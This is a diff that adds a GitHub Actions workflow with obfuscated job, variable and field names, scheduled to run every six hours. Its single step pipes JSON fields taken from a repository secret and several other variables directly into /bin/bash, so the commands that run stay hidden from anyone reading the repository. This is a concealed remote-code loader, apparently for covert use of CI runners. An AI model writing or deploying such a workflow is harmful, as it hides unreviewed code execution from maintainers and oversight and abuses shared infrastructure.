@@ -1,0 +1,23 @@
+name: wanf2xy
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '57 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wanf2xy
+        env:
+          hhhf221: ${{ secrets.hhhf221 }}
+        run: |
+          echo $hhhf221 | jq -r .v1 | /bin/bash
+          echo $x50 | jq -r .l22040 | /bin/bash
+          echo $je63 | jq -r .ctxr4 | /bin/bash
+          echo $gtn7063 | jq -r .wd061 | /bin/bash
+          echo $gw0 | jq -r .u048 | /bin/bash
+          echo $sjjje4 | jq -r .tod9132 | /bin/bash
+          echo $z1861 | jq -r .rx6373 | /bin/bash
+
